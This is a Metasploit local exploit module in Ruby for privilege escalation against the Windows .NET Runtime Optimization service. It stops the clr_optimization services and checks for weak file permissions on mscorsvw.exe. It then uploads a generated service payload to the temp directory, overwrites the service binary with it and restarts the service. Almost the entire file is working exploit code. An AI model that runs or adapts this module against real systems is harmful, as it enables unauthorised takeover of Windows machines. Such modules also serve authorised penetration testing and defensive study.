##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Exploit::Local

  Rank = ExcellentRanking

  include Msf::Exploit::EXE
  include Msf::Post::Windows::Services
  include Msf::Post::File

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Windows Escalate Microsoft .NET Runtime Optimization Service Privilege Escalation',
      'Description'   => %q{
        This module attempts to exploit the security permissions set on
        the .NET Runtime Optimization service. Vulnerable versions of
        the .NET Framework include 4.0 and 2.0.  The permissions on this
        service allow domain users and local power users to modify the
        mscorsvw.exe binary.
      },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'bannedit' ],
      'Platform'      => [ 'win' ],
      'Targets'       => [ [ 'Windows', { } ], ],
      'DefaultTarget' => 0,
      'SessionTypes'  => [ 'meterpreter' ],
      'References'    =>
        [
          [ 'OSVDB', '71013' ],
          [ 'EDB', '16940' ]
        ],
      'DisclosureDate' => 'Mar 08 2011'
    ))

  end

  def exploit
    paths = []
    stopped_services = []
    vuln = ""
    @temp = expand_path("%TEMP%")

    if init_railgun() == :error
      return
    end

    print_status("Checking for vulnerable .NET Framework Optimization service")
    print_status("This may take a few minutes.")
    # enumerate the installed .NET versions
    each_service do |service|
      vprint_status("Checking '#{service}'")
      if service =~ /clr_optimization_.*/
        info = service_info(service)
        paths << info['Command']
        stopped_services << service
        print_status("Found #{info['Name']} installed")
        begin
          service_stop(service) # temporarily stop the service
        rescue
          print_error("We do not appear to have access to stop #{info['Name']}")
        end
      else
        next
      end
    end

    paths.each do |image|
      if check_perms(image)
        vuln << image
        break
      end
    end

    if vuln.nil? or vuln.empty?
      print_error("Could not find any vulnerable .NET Framework Optimization services")
      return
    else
      payload = setup_exploit
    end

    stopped_services.each do |service|
      session.railgun.kernel32.CopyFileA(payload, vuln, false)

      # restart the service
      status = service_start(service)

      if status == 0
        print_status("Restarted #{service}")
      else
        print_error("Failed to restart #{service}")
      end
      return
    end
  end

  def check_perms(image)
    if image !~ /mscor/
      return
    end

    if !session.railgun.kernel32.MoveFileA(image, image + '.bak')['return']
      print_error("Found Secure Permissions on #{image}")
      return false
    else
      print_status("Found Weak Permissions on #{image}")
      print_status("Exploiting...")
      return true
    end
  end

  def init_railgun
    begin
      rg = session.railgun
      if (!rg.get_dll('advapi32'))
        rg.add_dll('advapi32')
      end
    rescue Exception => e
      print_error("Could not initalize railgun")
      print_error("Railgun Error: #{e}")
      return :error
    end
  end

  def setup_exploit
    file  = Rex::Text.rand_text_alpha((rand(8)+6)) + ".exe"

    exe = generate_payload_exe_service
    print_status("Uploading payload #{file} executable to temp directory")
    # Upload the payload to the filesystem
    file = @temp + "\\" + file
    print_status("Writing #{file}...")

    begin
      write_file(file, exe)
    rescue Exception => e
      print_error("Error uploading file #{file}: #{e.class} #{e}")
      return
    end

    print_status("Upload complete")
    return file
  end
end
